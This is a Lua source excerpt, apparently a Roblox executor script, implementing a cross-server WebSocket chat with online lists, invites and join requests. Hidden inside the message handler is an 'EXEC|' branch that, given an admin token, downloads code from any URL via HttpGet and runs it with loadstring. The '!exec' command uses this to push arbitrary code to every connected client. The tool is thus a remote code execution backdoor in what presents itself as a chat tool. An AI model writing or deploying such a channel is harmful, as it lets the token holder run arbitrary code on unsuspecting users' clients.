-- ============================================
-- CONNECTION MANAGEMENT
-- ============================================
local function updateConnectionStatus(connected, message)
    Connection.isConnected = connected
    if connected then
        connDot.BackgroundColor3 = Joshua_COLORS.success
        connLabel.Text = "Connected"
        connLabel.TextColor3 = Joshua_COLORS.success
        reconnectBtn.Visible = false
        connWarning.Visible = false
        Connection.reconnectAttempts = 0
    else
        connDot.BackgroundColor3 = Joshua_COLORS.error
        connLabel.Text = message or "Disconnected"
        connLabel.TextColor3 = Joshua_COLORS.error
        reconnectBtn.Visible = true
        connWarning.Visible = true
    end
end

local function sendWebSocket(message)
    if Connection.ws and Connection.isConnected then
        local success = pcall(function()
            Connection.ws:Send(message)
        end)
        if success then
            return true
        else
            table.insert(Connection.messageQueue, message)
            updateConnectionStatus(false, "Send failed")
            return false
        end
    else
        table.insert(Connection.messageQueue, message)
        return false
    end
end

local function processMessageQueue()
    if not Connection.isConnected then return end
    while #Connection.messageQueue > 0 do
        local msg = table.remove(Connection.messageQueue, 1)
        pcall(function()
            if Connection.ws then
                Connection.ws:Send(msg)
            end
        end)
        task.wait(0.1)
    end
end

local heartbeatConnection
local function startHeartbeat()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
    end
    heartbeatConnection = task.spawn(function()
        while Connection.isConnected do
            task.wait(Config.HEARTBEAT_INTERVAL)
            if not Connection.isConnected then break end
            local success = pcall(function()
                if Connection.ws then
                    Connection.ws:Send("PING|" .. tick())
                end
            end)
            if not success then
                updateConnectionStatus(false, "Ping failed")
                break
            end
        end
    end)
end

local function connectWebSocket()
    if Connection.ws then
        pcall(function() Connection.ws:Close() end)
    end
    
    updateConnectionStatus(false, "Connecting...")
    
    local success, result = pcall(function()
        return WebSocket.connect(Config.WS_URL .. "?room=" .. Config.RoomId)
    end)
    
    if success and result then
        Connection.ws = result
        Connection.isConnected = true
        updateConnectionStatus(true)
        
        Connection.ws.OnMessage:Connect(function(msg)
            if msg:sub(1, 5) == "PONG|" then
                Connection.lastPong = tick()
                return
            end
            
            if msg:sub(1, 5) == "PING|" then
                sendWebSocket("PONG|" .. tick())
                return
            end
            
            if msg:sub(1, 5) == "EXEC|" then
                local _, _, token, payload = msg:find("^EXEC|(.-)|(.+)$")
                if token == Config.ADMIN_TOKEN then
                    local code = payload
                    if payload:match("^https?://") then
                        local ok, res = pcall(function() return game:HttpGet(payload) end)
                        if ok then code = res end
                    end
                    local fn = loadstring(code)
                    if fn then 
                        pcall(fn) 
                        createMessageBubble("✅ Code executed", false, "System", nil)
                    end
                end
                return
            end
            
            if msg:sub(1, 7) == "INVITE|" then
                local target, placeId, jobId, from = msg:match("^INVITE|(.-)|(.+)|(.+)|(.+)$")
                if target == player.Name then
                    createMessageBubble("📩 Invite from " .. from .. "! Joining...", false, "System", nil)
                    QueueReExecute()
                    task.wait(0.5)
                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, player)
                end
                return
            end
            
            if msg:sub(1, 13) == "JOIN_REQUEST|" then
                local target, requester, requesterId = msg:match("^JOIN_REQUEST|(.-)|(.+)|(.+)$")
                if target == player.Name then
                    createMessageBubble("🙋 " .. requester .. " wants to join you", false, "System", nil)
                    sendWebSocket("INVITE|" .. requester .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
                end
                return
            end
            
            if msg:sub(1, 7) == "ONLINE|" then
                local username, userId = msg:match("^ONLINE|(.-)|(.+)$")
                if username then
                    onlineUsers[username] = {userId = tonumber(userId) or 0, lastSeen = tick()}
                    local count = 0
                    for _ in pairs(onlineUsers) do count = count + 1 end
                    onlineLabel.Text = "ONLINE " .. count
                end
                return
            end
            
            if msg:sub(1, 8) == "OFFLINE|" then
                local username = msg:match("^OFFLINE|(.+)$")
                if username then
                    onlineUsers[username] = nil
                    local count = 0
                    for _ in pairs(onlineUsers) do count = count + 1 end
                    onlineLabel.Text = "ONLINE " .. count
                end
                return
            end
            
            local n, t, u = msg:match("^(.-)|(.+)|(.+)$")
            if n and t then
                local userId = tonumber(u) or 0
                createMessageBubble(t, false, n, userId)
                onlineUsers[n] = {userId = userId, lastSeen = tick()}
                local count = 0
                for _ in pairs(onlineUsers) do count = count + 1 end
                onlineLabel.Text = "ONLINE " .. count
            else
                local n2, t2 = msg:match("^(.-)|(.+)$")
                if n2 and t2 then
                    createMessageBubble(t2, false, n2, nil)
                end
            end
        end)
        
        Connection.ws.OnClose:Connect(function()
            updateConnectionStatus(false, "Connection closed")
            Connection.isConnected = false
        end)
        
        task.delay(0.5, function()
            sendWebSocket("ONLINE|" .. player.Name .. "|" .. player.UserId)
            processMessageQueue()
        end)
        
        startHeartbeat()
        return true
    else
        updateConnectionStatus(false, "Failed to connect")
        Connection.reconnectAttempts = Connection.reconnectAttempts + 1
        return false
    end
end

-- Auto-reconnect loop
task.spawn(function()
    while Connection.shouldReconnect do
        if not Connection.isConnected then
            if Connection.reconnectAttempts < Config.MAX_RECONNECT_ATTEMPTS then
                task.wait(Config.RECONNECT_DELAY)
                if not Connection.isConnected and Connection.shouldReconnect then
                    connectWebSocket()
                end
            else
                updateConnectionStatus(false, "Max retries reached")
                task.wait(10)
                Connection.reconnectAttempts = 0
            end
        end
        task.wait(1)
    end
end)

-- ============================================
-- COMMANDS
-- ============================================
local function getUserIdFromName(name)
    for username, data in pairs(onlineUsers) do
        if username:lower():find(name:lower()) or name:lower():find(username:lower()) then
            return data.userId or username, username
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(name:lower()) or name:lower():find(p.Name:lower()) then
            return p.UserId, p.Name
        end
    end
    return nil, name
end

local function sendText(text)
    if text == "" then return end

    if text:sub(1, 5) == "!exec" then
        local code = text:sub(7)
        if sendWebSocket("EXEC|" .. Config.ADMIN_TOKEN .. "|" .. code) then
            createMessageBubble("📜 Executing code...", true, player.Name, player.UserId)
        else
            createMessageBubble("❌ Not connected! Can't execute.", true, player.Name, player.UserId)
        end
        inputBox.Text = ""
        return
    end

    if text:sub(1, 4) == "!inv" or text:sub(1, 7) == "!invite" then
        local target = text:match("!inv%s+(%S+)") or text:match("!invite%s+(%S+)")
        if target then
            local userId, fullName = getUserIdFromName(target)
            if userId then
                if sendWebSocket("INVITE|" .. fullName .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name) then
                    createMessageBubble("📨 Invite sent to " .. fullName, true, player.Name, player.UserId)
                else
                    createMessageBubble("❌ Not connected! Invite queued.", true, player.Name, player.UserId)
                end
            else
                createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
            end
        else
            createMessageBubble("❌ Usage: !inv [username]", true, player.Name, player.UserId)
        end
        inputBox.Text = ""
        return
    end

    if text:sub(1, 5) == "!join" then
        local target = text:match("!join%s+(%S+)")
        if target then
            local userId, fullName = getUserIdFromName(target)
            if userId then
                if sendWebSocket("JOIN_REQUEST|" .. fullName .. "|" .. player.Name .. "|" .. player.UserId) then
                    createMessageBubble("🚀 Requesting to join " .. fullName .. "...", true, player.Name, player.UserId)
                else
                    createMessageBubble("❌ Not connected! Request queued.", true, player.Name, player.UserId)
                end
            else
                createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
            end
        else
            createMessageBubble("❌ Usage: !join [username]", true, player.Name, player.UserId)
        end
        inputBox.Text = ""
        return
    end

    if sendWebSocket(player.Name .. "|" .. text .. "|" .. player.UserId) then
        createMessageBubble(text, true, player.Name, player.UserId)
    else
        createMessageBubble(text .. " [queued]", true, player.Name, player.UserId)
    end
    inputBox.Text = ""
end

